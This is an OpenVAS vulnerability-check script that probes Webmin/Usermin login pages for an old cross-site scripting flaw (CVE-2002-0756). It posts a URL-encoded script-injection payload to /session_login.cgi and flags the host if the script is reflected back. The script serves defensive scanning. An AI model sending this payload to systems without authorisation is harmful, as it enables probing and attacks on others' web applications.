###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webmin_login_xss_vuln.nasl 12175 2018-10-31 06:20:00Z ckuersteiner $
#
# Webmin / Usermin Login Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802258");
  script_version("$Revision: 12175 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-31 07:20:00 +0100 (Wed, 31 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-10-20 08:43:23 +0200 (Thu, 20 Oct 2011)");
  script_cve_id("CVE-2002-0756");
  script_bugtraq_id(4694);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Webmin / Usermin Login Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("webmin.nasl");
  script_require_ports("Services/www", 10000, 20000);
  script_mandatory_keys("usermin_or_webmin/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/9036");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2002-05/0040.html");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Webmin version 0.96 and Usermin version 0.90");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input via the
  authentication page, which allows attackers to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"solution", value:"Upgrade to Webmin version 0.970, Usermin version 0.910 or later.");

  script_tag(name:"summary", value:"This host is running Webmin/Usermin and is prone to cross site
  scripting vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.webmin.com/download.html");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

cpe_list = make_list( "cpe:/a:webmin:usermin", "cpe:/a:webmin:webmin" );

if( ! infos = get_all_app_ports_from_list( cpe_list:cpe_list ) ) exit( 0 );
port = infos['port'];

host = http_host_name( port:port );

postData = "page=%2F&user=%27%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&pass=";

req = string("POST /session_login.cgi HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Cookie: sid=; testing=1; user=x\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData), "\r\n\r\n", postData );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( ereg( pattern:"^HTTP/1\.[01] 200", string:res ) &&
    "><script>alert(document.cookie)</script>" >< res ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
